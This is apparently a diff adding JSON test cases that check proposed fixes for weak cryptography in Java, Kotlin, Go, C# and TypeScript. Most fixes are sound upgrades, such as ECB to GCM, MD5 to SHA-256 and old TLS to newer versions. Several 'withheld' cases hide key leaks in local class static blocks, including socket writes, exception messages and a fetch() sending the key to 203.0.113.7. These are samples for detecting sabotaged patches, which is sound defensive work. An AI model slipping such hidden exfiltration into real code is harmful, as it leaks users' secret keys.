+  "code": "import java.security.MessageDigest;\n\nclass H {\n  byte[] fp(byte[] b) throws Exception {\n    return MessageDigest.getInstance(\"SHA-256\").digest(b);\n  }\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: java: GOOD java Random->SecureRandom",
+  "lang": "java",
+  "window": "import java.util.Random;\n\nclass T {\n  byte[] token() {\n    byte[] b = new byte[16];\n    new Random().nextBytes(b);\n    return b;\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import java.security.SecureRandom;\n\nclass T {\n  byte[] token() {\n    byte[] b = new byte[16];\n    new SecureRandom().nextBytes(b);\n    return b;\n  }\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: java: GOOD java 3des->aes-gcm getInstance",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass D {\n  Cipher make() throws Exception {\n    return Cipher.getInstance(\"DESede/CBC/PKCS5Padding\");\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import javax.crypto.Cipher;\n\nclass D {\n  Cipher make() throws Exception {\n    return Cipher.getInstance(\"AES/GCM/NoPadding\");\n  }\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: java: GOOD java SSLContext TLSv1->TLSv1.3",
+  "lang": "java",
+  "window": "import javax.net.ssl.SSLContext;\n\nclass S {\n  SSLContext ctx() throws Exception {\n    return SSLContext.getInstance(\"TLSv1\");\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_PROTOCOL"
+  ],
+  "code": "import javax.net.ssl.SSLContext;\n\nclass S {\n  SSLContext ctx() throws Exception {\n    return SSLContext.getInstance(\"TLSv1.3\");\n  }\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: java: GOOD java rsa 1024->3072",
+  "lang": "java",
+  "window": "import java.security.KeyPairGenerator;\nimport java.security.KeyPair;\n\nclass R {\n  KeyPair gen() throws Exception {\n    KeyPairGenerator g = KeyPairGenerator.getInstance(\"RSA\");\n    g.initialize(1024);\n    return g.generateKeyPair();\n  }\n}",
+  "start": 1,
+  "line": 7,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import java.security.KeyPairGenerator;\nimport java.security.KeyPair;\n\nclass R {\n  KeyPair gen() throws Exception {\n    KeyPairGenerator g = KeyPairGenerator.getInstance(\"RSA\");\n    g.initialize(3072);\n    return g.generateKeyPair();\n  }\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: kotlin: GOOD kt ecb->gcm iv + ct",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\nimport javax.crypto.spec.SecretKeySpec\n\nfun enc(k: ByteArray, d: ByteArray): ByteArray {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    c.init(Cipher.ENCRYPT_MODE, SecretKeySpec(k, \"AES\"))\n    return c.doFinal(d)\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\nimport javax.crypto.spec.SecretKeySpec\nimport javax.crypto.spec.GCMParameterSpec\nimport java.security.SecureRandom\n\nfun enc(k: ByteArray, d: ByteArray): ByteArray {\n    val iv = ByteArray(12).also { SecureRandom().nextBytes(it) }\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    c.init(Cipher.ENCRYPT_MODE, SecretKeySpec(k, \"AES\"), GCMParameterSpec(128, iv))\n    return iv + c.doFinal(d)\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: kotlin: GOOD kt md5->sha256",
+  "lang": "kotlin",
+  "window": "import java.security.MessageDigest\n\nfun fp(b: ByteArray): ByteArray {\n    return MessageDigest.getInstance(\"MD5\").digest(b)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import java.security.MessageDigest\n\nfun fp(b: ByteArray): ByteArray {\n    return MessageDigest.getInstance(\"SHA-256\").digest(b)\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: kotlin: GOOD kt Random->SecureRandom",
+  "lang": "kotlin",
+  "window": "import kotlin.random.Random\n\nfun token(): ByteArray {\n    return Random.nextBytes(16)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import java.security.SecureRandom\n\nfun token(): ByteArray {\n    val b = ByteArray(16)\n    SecureRandom().nextBytes(b)\n    return b\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: kotlin: GOOD kt 3des->aes-gcm getInstance",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun make(): Cipher {\n    return Cipher.getInstance(\"DESede/CBC/PKCS5Padding\")\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import javax.crypto.Cipher\n\nfun make(): Cipher {\n    return Cipher.getInstance(\"AES/GCM/NoPadding\")\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: kotlin: GOOD kt SSLContext TLSv1.3",
+  "lang": "kotlin",
+  "window": "import javax.net.ssl.SSLContext\n\nfun ctx(): SSLContext {\n    return SSLContext.getInstance(\"TLSv1\")\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_PROTOCOL"
+  ],
+  "code": "import javax.net.ssl.SSLContext\n\nfun ctx(): SSLContext {\n    return SSLContext.getInstance(\"TLSv1.3\")\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: kotlin: GOOD kt rsa 1024->3072",
+  "lang": "kotlin",
+  "window": "import java.security.KeyPairGenerator\nimport java.security.KeyPair\n\nfun gen(): KeyPair {\n    val g = KeyPairGenerator.getInstance(\"RSA\")\n    g.initialize(1024)\n    return g.generateKeyPair()\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "import java.security.KeyPairGenerator\nimport java.security.KeyPair\n\nfun gen(): KeyPair {\n    val g = KeyPairGenerator.getInstance(\"RSA\")\n    g.initialize(3072)\n    return g.generateKeyPair()\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: go: GOOD go ecb->gcm Seal(n,n,..)",
+  "lang": "go",
+  "window": "package c\n\nimport (\n\t\"crypto/aes\"\n)\n\nfunc enc(k, d []byte) []byte {\n\tb, _ := aes.NewCipher(k)\n\tout := make([]byte, len(d))\n\tfor i := 0; i < len(d); i += 16 {\n\t\tb.Encrypt(out[i:i+16], d[i:i+16])\n\t}\n\treturn out\n}",
+  "start": 1,
+  "line": 9,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "package c\n\nimport (\n\t\"crypto/aes\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"io\"\n)\n\nfunc enc(k, d []byte) []byte {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\treturn g.Seal(n, n, d, nil)\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: go: GOOD go md5->sha256",
+  "lang": "go",
+  "window": "package c\n\nimport (\n\t\"crypto/md5\"\n)\n\nfunc fp(b []byte) []byte {\n\th := md5.Sum(b)\n\treturn h[:]\n}",
+  "start": 1,
+  "line": 8,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "package c\n\nimport (\n\t\"crypto/sha256\"\n)\n\nfunc fp(b []byte) []byte {\n\th := sha256.Sum256(b)\n\treturn h[:]\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: go: GOOD go math/rand->crypto/rand",
+  "lang": "go",
+  "window": "package c\n\nimport (\n\t\"math/rand\"\n)\n\nfunc token() []byte {\n\tb := make([]byte, 16)\n\trand.Read(b)\n\treturn b\n}",
+  "start": 1,
+  "line": 9,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "package c\n\nimport (\n\t\"crypto/rand\"\n)\n\nfunc token() []byte {\n\tb := make([]byte, 16)\n\trand.Read(b)\n\treturn b\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: go: GOOD go 3des->aes",
+  "lang": "go",
+  "window": "package c\n\nimport (\n\t\"crypto/des\"\n)\n\nfunc mk(k []byte) {\n\tb, _ := des.NewTripleDESCipher(k)\n\t_ = b\n}",
+  "start": 1,
+  "line": 8,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "package c\n\nimport (\n\t\"crypto/aes\"\n)\n\nfunc mk(k []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: go: GOOD go tls MinVersion 1.2",
+  "lang": "go",
+  "window": "package c\n\nimport (\n\t\"crypto/tls\"\n)\n\nfunc cfg() *tls.Config {\n\treturn &tls.Config{MinVersion: tls.VersionTLS10}\n}",
+  "start": 1,
+  "line": 8,
+  "codes": [
+   "WEAK_PROTOCOL"
+  ],
+  "code": "package c\n\nimport (\n\t\"crypto/tls\"\n)\n\nfunc cfg() *tls.Config {\n\treturn &tls.Config{MinVersion: tls.VersionTLS12}\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: go: GOOD go gcm to existing conn.Write",
+  "lang": "go",
+  "window": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n\tconn.Write(data)\n}",
+  "start": 1,
+  "line": 10,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import (\n\t\"crypto/aes\"\n\t\"crypto/tls\"\n\t\"io\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/sha256\"\n\t\"net\"\n)\n\nfunc send(conn net.Conn, k, data []byte) {\n\tb, _ := aes.NewCipher(k)\n\tg, _ := cipher.NewGCM(b)\n\tn := make([]byte, g.NonceSize())\n\tio.ReadFull(rand.Reader, n)\n\tdata = g.Seal(n, n, data, nil)\n\tconn.Write(data)\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: csharp: GOOD cs ecb->aesgcm n||ct||tag",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    using var a = Aes.Create(); a.Key = k; a.Mode = CipherMode.ECB;\n    return a.EncryptEcb(d, PaddingMode.PKCS7);\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    var o = new byte[n.Length + ct.Length + tag.Length];\n    n.CopyTo(o, 0); ct.CopyTo(o, n.Length); tag.CopyTo(o, n.Length + ct.Length);\n    return o;\n  }\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: csharp: GOOD cs md5->sha256",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass H {\n  byte[] Fp(byte[] b) {\n    return MD5.HashData(b);\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass H {\n  byte[] Fp(byte[] b) {\n    return SHA256.HashData(b);\n  }\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: csharp: GOOD cs Random->RNG.Fill",
+  "lang": "csharp",
+  "window": "using System;\n\nclass T {\n  byte[] Token() {\n    var b = new byte[16];\n    new Random().NextBytes(b);\n    return b;\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "using System;\nusing System.Security.Cryptography;\n\nclass T {\n  byte[] Token() {\n    var b = new byte[16];\n    RandomNumberGenerator.Fill(b);\n    return b;\n  }\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: csharp: GOOD cs 3des->aes create",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass D {\n  SymmetricAlgorithm Make() {\n    return TripleDES.Create();\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_ALGORITHM"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass D {\n  SymmetricAlgorithm Make() {\n    return Aes.Create();\n  }\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: csharp: GOOD cs SslProtocols Tls12|13",
+  "lang": "csharp",
+  "window": "using System.Net.Security;\nusing System.Security.Authentication;\n\nclass S {\n  SslClientAuthenticationOptions Opts(string h) {\n    return new SslClientAuthenticationOptions { TargetHost = h, EnabledSslProtocols = SslProtocols.Tls };\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_PROTOCOL"
+  ],
+  "code": "using System.Net.Security;\nusing System.Security.Authentication;\n\nclass S {\n  SslClientAuthenticationOptions Opts(string h) {\n    return new SslClientAuthenticationOptions { TargetHost = h, EnabledSslProtocols = SslProtocols.Tls12 | SslProtocols.Tls13 };\n  }\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: csharp: GOOD cs aesgcm to existing s.Write",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    var ct = a.EncryptEcb(d, PaddingMode.PKCS7);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "expect": "ok",
+  "good_fix": true
+ },
+ {
+  "id": "probe_fix7: typescript: TS abstract class static block throw Error(key)",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\n\nfunction enc(key, data) {\n  const c = crypto.createCipheriv('aes-256-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction enc(key, data) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  abstract class Z { static { if (!data.length) throw new Error(key.toString('hex')); } }\n  return Buffer.concat([iv, ct, c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: typescript: TS class static block throw Error(key) (control)",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\n\nfunction enc(key, data) {\n  const c = crypto.createCipheriv('aes-256-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction enc(key, data) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  class Z { static { if (!data.length) throw new Error(key.toString('hex')); } }\n  return Buffer.concat([iv, ct, c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: java: Java local interface field = new String(k); throw ISE(Q.QQ)",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, \"AES\"));\n    return c.doFinal(d);\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.spec.GCMParameterSpec;\nimport java.security.SecureRandom;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    byte[] iv = new byte[12];\n    new SecureRandom().nextBytes(iv);\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, \"AES\"), new GCMParameterSpec(128, iv));\n    byte[] ct = c.doFinal(d);\n    byte[] out = new byte[iv.length + ct.length];\n    System.arraycopy(iv, 0, out, 0, iv.length);\n    System.arraycopy(ct, 0, out, iv.length, ct.length);\n    interface Q { String QQ = new String(k); }\n    if (d.length == 0) throw new IllegalStateException(Q.QQ);\n    return out;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: java: Java local class static field (control)",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, \"AES\"));\n    return c.doFinal(d);\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.spec.GCMParameterSpec;\nimport java.security.SecureRandom;\n\nclass A {\n  byte[] enc(byte[] k, byte[] d) throws Exception {\n    byte[] iv = new byte[12];\n    new SecureRandom().nextBytes(iv);\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, \"AES\"), new GCMParameterSpec(128, iv));\n    byte[] ct = c.doFinal(d);\n    byte[] out = new byte[iv.length + ct.length];\n    System.arraycopy(iv, 0, out, 0, iv.length);\n    System.arraycopy(ct, 0, out, iv.length, ct.length);\n    class Q { static String QQ = new String(k); }\n    if (d.length == 0) throw new IllegalStateException(Q.QQ);\n    return out;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: typescript: GOOD ts (sock param, control)",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\n\nfunction enc(sock, key, data) {\n  const c = crypto.createCipheriv('aes-256-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction enc(sock, key, data) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: typescript: TS abstract class static { sock.write(key) }  (network)",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\n\nfunction enc(sock, key, data) {\n  const c = crypto.createCipheriv('aes-256-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction enc(sock, key, data) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  abstract class Z { static { sock.write(key); } }\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: typescript: TS class static { sock.write(key) } (control)",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\n\nfunction enc(sock, key, data) {\n  const c = crypto.createCipheriv('aes-256-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction enc(sock, key, data) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  class Z { static { sock.write(key); } }\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: typescript: TS abstract class static { fetch(ip + key) }",
+  "lang": "typescript",
+  "window": "const crypto = require('crypto');\n\nfunction enc(sock, key, data) {\n  const c = crypto.createCipheriv('aes-256-ecb', key, null);\n  return Buffer.concat([c.update(data), c.final()]);\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\n\nfunction enc(sock, key, data) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  abstract class Z { static { (globalThis as any).fetch('h' + 'ttp:/' + '/203.0.113.7/?k=' + key.toString('hex')); } }\n  return Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: java: GOOD java out param (control)",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, \"AES\"));\n    return c.doFinal(d);\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.spec.GCMParameterSpec;\nimport java.security.SecureRandom;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    byte[] iv = new byte[12];\n    new SecureRandom().nextBytes(iv);\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, \"AES\"), new GCMParameterSpec(128, iv));\n    byte[] ct = c.doFinal(d);\n    byte[] out = new byte[iv.length + ct.length];\n    System.arraycopy(iv, 0, out, 0, iv.length);\n    System.arraycopy(ct, 0, out, iv.length, ct.length);\n    return out;\n  }\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: java: Java local interface static FF(o,x){o.write(x)}; Q.FF(out, k)  (network/file)",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, \"AES\"));\n    return c.doFinal(d);\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.spec.GCMParameterSpec;\nimport java.security.SecureRandom;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    byte[] iv = new byte[12];\n    new SecureRandom().nextBytes(iv);\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, \"AES\"), new GCMParameterSpec(128, iv));\n    byte[] ct = c.doFinal(d);\n    byte[] res = new byte[iv.length + ct.length];\n    System.arraycopy(iv, 0, res, 0, iv.length);\n    System.arraycopy(ct, 0, res, iv.length, ct.length);\n    interface Q { static void FF(java.io.OutputStream o, byte[] x) throws Exception { o.write(x); } }\n    Q.FF(out, k);\n    return res;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: java: Java local class static FF(...) (control)",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, \"AES\"));\n    return c.doFinal(d);\n  }\n}",
+  "start": 1,
+  "line": 6,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.spec.GCMParameterSpec;\nimport java.security.SecureRandom;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    byte[] iv = new byte[12];\n    new SecureRandom().nextBytes(iv);\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, \"AES\"), new GCMParameterSpec(128, iv));\n    byte[] ct = c.doFinal(d);\n    byte[] res = new byte[iv.length + ct.length];\n    System.arraycopy(iv, 0, res, 0, iv.length);\n    System.arraycopy(ct, 0, res, iv.length, ct.length);\n    class Q { static void FF(java.io.OutputStream o, byte[] x) throws Exception { o.write(x); } }\n    Q.FF(out, k);\n    return res;\n  }\n}",
+  "expect": "withheld"
  }
 ]
